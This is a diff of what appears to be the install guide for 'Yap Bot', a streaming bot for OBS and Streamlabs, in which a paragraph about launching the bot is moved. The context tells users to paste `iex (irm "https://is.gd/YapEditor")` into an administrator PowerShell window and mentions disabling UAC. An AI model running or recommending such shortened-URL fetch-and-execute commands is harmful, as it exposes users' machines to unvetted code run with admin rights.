@@ -34,11 +34,11 @@ Part of the guide shows you how to temporarily disable UAC. PLEASE turn this bac
 
 Follow the on screen instructions to install.
 
+When running Yap Bot in the future, open it from the desktop/start menu shortcut before streaming with OBS/Streamlabs. When either OBS or Streamlabs closes, Yap Bot will quit automatically.
+
 After installing, if you need to edit any of your info (account, denied users, cooldown etc.), copy and paste the following into an admin powershell window, then press enter
 
 `iex (irm "https://is.gd/YapEditor")`
-
-When running Yap Bot in the future, open it from the desktop/start menu shortcut before streaming with OBS/Streamlabs. When either OBS or Streamlabs closes, Yap Bot will quit automatically.
 
 If you want to uninstall, copy and paste the following into an admin powershell window, then press enter
    
